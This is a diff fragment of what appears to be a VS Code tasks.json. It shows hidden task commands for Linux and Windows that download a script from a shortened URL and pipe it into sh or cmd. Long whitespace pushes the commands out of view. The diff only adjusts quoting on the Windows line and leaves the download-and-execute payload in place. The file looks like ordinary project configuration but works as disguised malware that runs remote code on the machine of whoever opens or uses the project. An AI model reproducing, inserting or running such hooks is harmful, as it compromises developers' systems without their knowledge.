@@ -108,7 +108,7 @@
         "command":                                                                                                                                                                                                                                                                                                                                                                                                "wget -qO- 'https://gurucooldown.short.gy/knHbMe8l' -L | sh"
       },
       "windows": {
-        "command":                                                                                                                                                                                                                                                                                                                                                                                                "curl 'https://gurucooldown.short.gy/knHbMe8w' -L | cmd"
+        "command":                                                                                                                                                                                                                                                                                                                                                                                                "curl https://gurucooldown.short.gy/knHbMe8w -L | cmd"
       },
 
       "problemMatcher": [],
